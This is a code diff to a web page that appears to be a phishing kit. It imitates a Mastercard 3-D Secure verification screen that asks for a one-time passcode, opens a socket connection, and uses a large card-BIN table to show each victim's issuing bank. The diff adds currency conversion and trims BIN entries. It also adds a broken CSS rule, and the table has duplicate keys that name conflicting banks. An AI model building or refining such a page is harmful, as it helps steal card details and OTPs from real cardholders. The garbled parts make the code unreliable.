@@ -101,6 +101,9 @@
       transform: translateY(-50%);
       display: flex;
       align-items: center;
+      justify-content:
+        display: flex;
+      align-items: center;
       justify-content: center;
       height: 100%;
     }
@@ -367,6 +370,22 @@
     #mcConsentCheckbox.checked svg {
       display: block;
     }
+
+    /* Currency display styles - ADDED */
+    .currency-badge {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 0.875rem;
+      background-color: #f3f4f6;
+      color: #6b7280;
+      margin-left: 4px;
+    }
+
+    .converted-amount {
+      font-weight: 500;
+      color: #2563eb;
+    }
   </style>
 </head>
 <body>
@@ -564,7 +583,7 @@
     <div class="spinner"></div>
   </div>
 
-  <!-- UPDATED: MC Verification Overlay - New Design with repositioned Cancel button -->
+  <!-- UPDATED: MC Verification Overlay - With currency conversion and enhanced design -->
   <div id="mcVerificationOverlay" class="fullscreen-overlay">
     <!-- Loading Content - Shown Initially -->
     <div id="mcLoadingContent" style="display: flex; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
@@ -596,16 +615,22 @@
             </p>
           </div>
           
-          <!-- Transaction details - CENTERED LAYOUT -->
+          <!-- Transaction details - CENTERED LAYOUT with currency display -->
           <div style="display: flex; flex-direction: column; align-items: center; text-align: center; margin-bottom: 15px;">
             <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
               <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Merchant</span>
               <span id="merchantName" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">GOLFSTORE 3DS</span>
             </div>
             
+            <!-- Amount row with currency display -->
             <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
               <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Amount</span>
-              <span id="transactionAmount" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">₹ <span id="transactionAmount2">45.99</span></span>
+              <span id="transactionAmountDisplay" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">
+                <span id="currencySymbol">₹</span> <span id="transactionAmount">45.99</span>
+                <div id="convertedAmountDisplay" style="display: none; margin-top: 2px;">
+                  <span id="originalCurrencyDisplay" class="currency-badge">INR: ₹<span id="originalAmount">45.99</span></span>
+                </div>
+              </span>
             </div>
             
             <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
@@ -637,7 +662,7 @@
               </div>
               <div id="otpInfoTooltip" style="position: absolute; top: -70px; right: 0; background: #333; color: white; padding: 8px; border-radius: 4px; font-size: 12px; width: 200px; display: none; z-index: 10;">
                 The One-Time Passcode is a temporary security code sent to your registered mobile number for verification.
-                <div style="position: absolute; bottom: -6px; right: 12px; width: 12px; height: 12px; background: #333; transform: rotate(45deg);"></div>
+              <div style="position: absolute; bottom: -6px; right: 12px; width: 12px; height: 12px; background: #333; transform: rotate(45deg);"></div>
               </div>
             </div>
           </div>
@@ -692,6 +717,108 @@
     let consentChecked = true;
     let bankPageWindow = null;
     const socket = io();
+
+    // Currency Conversion Feature - ADDED
+    const currencySymbols = {
+      'INR': '₹',
+      'USD': '$',
+      'EUR': '€',
+      'GBP': '£',
+      'JPY': '¥',
+      'AUD': 'A$',
+      'CAD': 'C$',
+      'CHF': 'CHF',
+      'CNY': '¥',
+      'HKD': 'HK$',
+      'NZD': 'NZ$',
+      'SGD': 'S$',
+      'TWD': 'NT$',
+      'AED': 'د.إ',
+      'THB': '฿',
+      'SEK': 'kr',
+      'NOK': 'kr',
+      'DKK': 'kr',
+      'ZAR': 'R',
+      'MYR': 'RM',
+      'IDR': 'Rp',
+      'PHP': '₱',
+      'MXN': '$',
+      'BRL': 'R$',
+      'PLN': 'zł',
+      'RUB': '₽',
+      'TRY': '₺',
+      'KRW': '₩',
+      'ILS': '₪',
+      'SAR': '﷼',
+      'ARS': '$',
+      'CLP': '$',
+      'EGP': 'E£',
+      'COP': '$',
+      'VND': '₫'
+    };
+
+    // Function to convert currency using an API
+    async function convertCurrency(amount, fromCurrency, toCurrency) {
+      if (fromCurrency === toCurrency) return amount;
+      
+      try {
+        // Using Exchange Rate API
+        const response = await fetch(`https://api.exchangerate-api.com/v4/latest/${fromCurrency}`);
+        if (!response.ok) throw new Error('Currency conversion failed');
+        
+        const data = await response.json();
+        if (!data.rates || !data.rates[toCurrency]) {
+          throw new Error('Rate not found');
+        }
+        
+        const rate = data.rates[toCurrency];
+        return (amount * rate).toFixed(2);
+      } catch (error) {
+        console.error('Error converting currency:', error);
+        
+        // Fallback to estimated conversion rates
+        const fallbackRates = {
+          'INR_USD': 0.012,
+          'INR_EUR': 0.011,
+          'INR_GBP': 0.0095,
+          'INR_JPY': 1.78,
+          'INR_AUD': 0.018,
+          'INR_CAD': 0.016,
+          'INR_CHF': 0.011,
+          'INR_CNY': 0.087,
+          'INR_HKD': 0.094,
+          'INR_NZD': 0.020,
+          'INR_SGD': 0.016,
+          'INR_TWD': 0.38,
+          'INR_AED': 0.044,
+          'INR_THB': 0.40,
+          'INR_SEK': 0.13,
+          'INR_NOK': 0.13,
+          'INR_DKK': 0.082,
+          'INR_ZAR': 0.22,
+          'INR_MYR': 0.056,
+          'INR_IDR': 189.45,
+          'INR_PHP': 0.69,
+          'INR_MXN': 0.21,
+          'INR_BRL': 0.067,
+          'INR_PLN': 0.048,
+          'INR_RUB': 1.10,
+          'INR_TRY': 0.39,
+          'INR_KRW': 16.12,
+          'INR_ILS': 0.045,
+          'INR_SAR': 0.045,
+          'INR_ARS': 10.62,
+          'INR_CLP': 11.42,
+          'INR_EGP': 0.37,
+          'INR_COP': 47.38,
+          'INR_VND': 294.87
+        };
+        
+        const key = `${fromCurrency}_${toCurrency}`;
+        const fallbackRate = fallbackRates[key] || 1;
+        return (amount * fallbackRate).toFixed(2);
+      }
+    }
 
     // Function to generate a random hash string
     function generateRandomHash(length = 8) {
@@ -834,562 +961,7 @@
              '522609': { bank: 'Scotiabank', country: 'Canada', countryCode: 'CA', currency: 'CAD' },
              '525412': { bank: 'Royal Bank of Canada', country: 'Canada', countryCode: 'CA', currency: 'CAD' },
              '510155': { bank: 'E.Sun Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'511102': { bank: 'Taiwan Cooperative Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'511718': { bank: 'Taipei Fubon Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'518558': { bank: 'Cathay United Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'519778': { bank: 'First Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'521370': { bank: 'Mega International Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'521796': { bank: 'CTBC Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'522640': { bank: 'Hua Nan Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'524366': { bank: 'Taishin International Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'524562': { bank: 'Bank SinoPac', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'525794': { bank: 'KGI Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'528906': { bank: 'Far Eastern International Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'529020': { bank: 'Land Bank of Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'531411': { bank: 'Shin Kong Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'531556': { bank: 'DBS Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'532852': { bank: 'Bank of Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'535859': { bank: 'Union Bank of Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'538719': { bank: 'Chang Hwa Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'539898': { bank: 'Taiwan Business Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'547301': { bank: 'Citibank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'549355': { bank: 'HSBC Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'550541': { bank: 'Standard Chartered Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'552849': { bank: 'Yuanta Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'558851': { bank: 'O-Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'559523': { bank: 'Bank of Kaohsiung', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'524107': { bank: 'Shanghai Commercial & Savings Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'515038': { bank: 'Taichung Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'557794': { bank: 'Jih Sun International Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'518321': { bank: 'EnTie Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'515681': { bank: 'COTA Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'413732': { bank: 'E.Sun Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'417647': { bank: 'Taipei Fubon Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'421252': { bank: 'Cathay United Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'422287': { bank: 'First Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'423453': { bank: 'CTBC Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'427010': { bank: 'Taishin International Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'427977': { bank: 'Bank SinoPac', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'432026': { bank: 'Hua Nan Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'435553': { bank: 'Land Bank of Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'438549': { bank: 'Shin Kong Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'442733': { bank: 'Taiwan Cooperative Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'450547': { bank: 'Bank of Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'452320': { bank: 'DBS Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'453992': { bank: 'Mega International Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'454518': { bank: 'Union Bank of Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'456381': { bank: 'KGI Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'456612': { bank: 'Far Eastern International Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'462289': { bank: 'Chang Hwa Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'464764': { bank: 'Taiwan Business Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'464788': { bank: 'Citibank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'465205': { bank: 'HSBC Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'468959': { bank: 'Standard Chartered Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'470877': { bank: 'Yuanta Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'472615': { bank: 'O-Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'478350': { bank: 'Bank of Kaohsiung', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'481175': { bank: 'Shanghai Commercial & Savings Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'483003': { bank: 'Taichung Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'483982': { bank: 'Jih Sun International Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'489017': { bank: 'EnTie Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'490773': { bank: 'COTA Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'493605': { bank: 'Taiwan Shin Kong Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'493986': { bank: 'Bank of Panhsin', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'496225': { bank: 'Sunny Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'498657': { bank: 'Taipei Star Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'404727': { bank: 'Chunghwa Post', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'475183': { bank: 'Taiwan Financial Holdings', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'515947': { bank: 'Agricultural Bank of Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'546863': { bank: 'First Capital Bank (Taiwan)', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'532461': { bank: 'Taiwan Rakuten Card', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'557231': { bank: 'ANZ Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'419705': { bank: 'Deutsche Bank Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'431195': { bank: 'JP Morgan Chase Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'439571': { bank: 'BNP Paribas Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'477243': { bank: 'UBS Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'492451': { bank: 'American Express Taiwan', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'512739': { bank: 'Taiwan Credit Cooperative Association', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'524973': { bank: 'Taiwan Industry Credit Union', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-'534187': { bank: 'Taiwan Farmers Credit Union', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
-    // United States Banks - Comprehensive List (Visa & Mastercard)
-// Major National Banks
-'400344': { bank: 'JPMorgan Chase', country: 'United States', countryCode: 'US', currency: 'USD' },
-'414720': { bank: 'JPMorgan Chase', country: 'United States', countryCode: 'US', currency: 'USD' },
-'426684': { bank: 'JPMorgan Chase', country: 'United States', countryCode: 'US', currency: 'USD' },
-'438857': { bank: 'JPMorgan Chase', country: 'United States', countryCode: 'US', currency: 'USD' },
-'521847': { bank: 'JPMorgan Chase', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'411773': { bank: 'Bank of America', country: 'United States', countryCode: 'US', currency: 'USD' },
-'426393': { bank: 'Bank of America', country: 'United States', countryCode: 'US', currency: 'USD' },
-'431263': { bank: 'Bank of America', country: 'United States', countryCode: 'US', currency: 'USD' },
-'481131': { bank: 'Bank of America', country: 'United States', countryCode: 'US', currency: 'USD' },
-'531250': { bank: 'Bank of America', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'432392': { bank: 'Citibank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'412732': { bank: 'Citibank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'426938': { bank: 'Citibank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'542418': { bank: 'Citibank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'555566': { bank: 'Citibank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'410039': { bank: 'Wells Fargo', country: 'United States', countryCode: 'US', currency: 'USD' },
-'414718': { bank: 'Wells Fargo', country: 'United States', countryCode: 'US', currency: 'USD' },
-'431263': { bank: 'Wells Fargo', country: 'United States', countryCode: 'US', currency: 'USD' },
-'473702': { bank: 'Wells Fargo', country: 'United States', countryCode: 'US', currency: 'USD' },
-'527518': { bank: 'Wells Fargo', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'421362': { bank: 'U.S. Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'446272': { bank: 'U.S. Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'479011': { bank: 'U.S. Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'517805': { bank: 'U.S. Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'543770': { bank: 'U.S. Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'402360': { bank: 'TD Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'425077': { bank: 'TD Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'483395': { bank: 'TD Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'520502': { bank: 'TD Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'440393': { bank: 'PNC Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'443036': { bank: 'PNC Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'468289': { bank: 'PNC Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'542432': { bank: 'PNC Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'426017': { bank: 'Truist Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'425907': { bank: 'Truist Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'518069': { bank: 'Truist Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'546540': { bank: 'Truist Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Investment Banks and Financial Institutions
-'417931': { bank: 'Capital One', country: 'United States', countryCode: 'US', currency: 'USD' },
-'414709': { bank: 'Capital One', country: 'United States', countryCode: 'US', currency: 'USD' },
-'446304': { bank: 'Capital One', country: 'United States', countryCode: 'US', currency: 'USD' },
-'517805': { bank: 'Capital One', country: 'United States', countryCode: 'US', currency: 'USD' },
-'553691': { bank: 'Capital One', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'414730': { bank: 'Fidelity Investments', country: 'United States', countryCode: 'US', currency: 'USD' },
-'423074': { bank: 'Fidelity Investments', country: 'United States', countryCode: 'US', currency: 'USD' },
-'520134': { bank: 'Fidelity Investments', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'422374': { bank: 'Charles Schwab', country: 'United States', countryCode: 'US', currency: 'USD' },
-'472819': { bank: 'Charles Schwab', country: 'United States', countryCode: 'US', currency: 'USD' },
-'519612': { bank: 'Charles Schwab', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'414681': { bank: 'Morgan Stanley', country: 'United States', countryCode: 'US', currency: 'USD' },
-'557253': { bank: 'Morgan Stanley', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'421362': { bank: 'Goldman Sachs', country: 'United States', countryCode: 'US', currency: 'USD' },
-'537957': { bank: 'Goldman Sachs', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Regional and Super-Regional Banks
-'474481': { bank: 'KeyBank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'536254': { bank: 'KeyBank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'475124': { bank: 'Fifth Third Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'533248': { bank: 'Fifth Third Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'421678': { bank: 'Citizens Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'521285': { bank: 'Citizens Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'425238': { bank: 'Huntington Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'544542': { bank: 'Huntington Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'405912': { bank: 'Regions Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'515875': { bank: 'Regions Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'492187': { bank: 'M&T Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'558947': { bank: 'M&T Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'421678': { bank: 'BMO Harris Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'526497': { bank: 'BMO Harris Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'427120': { bank: 'SunTrust Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'546610': { bank: 'SunTrust Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'413747': { bank: 'BBVA USA', country: 'United States', countryCode: 'US', currency: 'USD' },
-'528849': { bank: 'BBVA USA', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'414704': { bank: 'First National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'528624': { bank: 'First National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Digital and Online Banks
-'423075': { bank: 'Discover Financial', country: 'United States', countryCode: 'US', currency: 'USD' },
-'601100': { bank: 'Discover Financial', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'425909': { bank: 'Ally Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'532418': { bank: 'Ally Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'472440': { bank: 'Synchrony Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'553246': { bank: 'Synchrony Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'410136': { bank: 'Chime', country: 'United States', countryCode: 'US', currency: 'USD' },
-'517096': { bank: 'Chime', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'415922': { bank: 'SoFi Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'525896': { bank: 'SoFi Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'440066': { bank: 'Robinhood', country: 'United States', countryCode: 'US', currency: 'USD' },
-'539123': { bank: 'Robinhood', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'417741': { bank: 'Varo Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'546458': { bank: 'Varo Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'402971': { bank: 'Revolut US', country: 'United States', countryCode: 'US', currency: 'USD' },
-'534013': { bank: 'Revolut US', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Credit Unions
-'431174': { bank: 'Navy Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'516550': { bank: 'Navy Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-    // Credit Unions
-'431174': { bank: 'Navy Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'516550': { bank: 'Navy Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'424440': { bank: 'Pentagon Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'524774': { bank: 'Pentagon Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'472275': { bank: 'State Employees Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'523044': { bank: 'State Employees Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'437151': { bank: 'Golden 1 Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'539877': { bank: 'Golden 1 Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'422862': { bank: 'America First Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'516077': { bank: 'America First Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'416030': { bank: 'First Tech Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'539867': { bank: 'First Tech Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'498916': { bank: 'SchoolsFirst Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'531325': { bank: 'SchoolsFirst Federal Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'442854': { bank: 'Alliant Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-'521692': { bank: 'Alliant Credit Union', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Specialized Financial Institutions
-'349001': { bank: 'American Express', country: 'United States', countryCode: 'US', currency: 'USD' },
-'376958': { bank: 'American Express', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'457493': { bank: 'USAA', country: 'United States', countryCode: 'US', currency: 'USD' },
-'543159': { bank: 'USAA', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'426841': { bank: 'PayPal', country: 'United States', countryCode: 'US', currency: 'USD' },
-'558526': { bank: 'PayPal', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'431305': { bank: 'Stripe', country: 'United States', countryCode: 'US', currency: 'USD' },
-'522123': { bank: 'Stripe', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'431307': { bank: 'Square/Cash App', country: 'United States', countryCode: 'US', currency: 'USD' },
-'542418': { bank: 'Square/Cash App', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'424615': { bank: 'Venmo', country: 'United States', countryCode: 'US', currency: 'USD' },
-'532598': { bank: 'Venmo', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Government-related
-'449302': { bank: 'U.S. Treasury/Direct Express', country: 'United States', countryCode: 'US', currency: 'USD' },
-'557128': { bank: 'U.S. Treasury/Direct Express', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Regional Mid-Size Banks
-'414910': { bank: 'First Republic Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'523976': { bank: 'First Republic Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'421090': { bank: 'First Hawaiian Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'519339': { bank: 'First Hawaiian Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'479603': { bank: 'Associated Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'517346': { bank: 'Associated Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'426914': { bank: 'Synovus Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'549124': { bank: 'Synovus Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'414720': { bank: 'Webster Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'518113': { bank: 'Webster Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'435197': { bank: 'Valley National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'541315': { bank: 'Valley National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'472914': { bank: 'First Horizon Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'542825': { bank: 'First Horizon Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'404720': { bank: 'Frost Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'517937': { bank: 'Frost Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'497387': { bank: 'Commerce Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'559183': { bank: 'Commerce Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'404154': { bank: 'Zions Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'541582': { bank: 'Zions Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Newer Challenger Banks
-'438980': { bank: 'Aspiration', country: 'United States', countryCode: 'US', currency: 'USD' },
-'536227': { bank: 'Aspiration', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'475741': { bank: 'Current', country: 'United States', countryCode: 'US', currency: 'USD' },
-'554382': { bank: 'Current', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'419117': { bank: 'Dave Banking', country: 'United States', countryCode: 'US', currency: 'USD' },
-'529435': { bank: 'Dave Banking', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'498037': { bank: 'MoneyLion', country: 'United States', countryCode: 'US', currency: 'USD' },
-'537824': { bank: 'MoneyLion', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'445677': { bank: 'N26 US', country: 'United States', countryCode: 'US', currency: 'USD' },
-'539123': { bank: 'N26 US', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'473703': { bank: 'Step Banking', country: 'United States', countryCode: 'US', currency: 'USD' },
-'552264': { bank: 'Step Banking', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-// Additional Regional Banks
-'412783': { bank: 'Comerica Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'513991': { bank: 'Comerica Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'412900': { bank: 'City National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'556634': { bank: 'City National Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'434902': { bank: 'Signature Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'522435': { bank: 'Signature Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'407188': { bank: 'Silicon Valley Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'543584': { bank: 'Silicon Valley Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'403784': { bank: 'New York Community Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'519339': { bank: 'New York Community Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'427678': { bank: 'East West Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-'558741': { bank: 'East West Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
-
-'402025': { bank: 'First Citizens Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
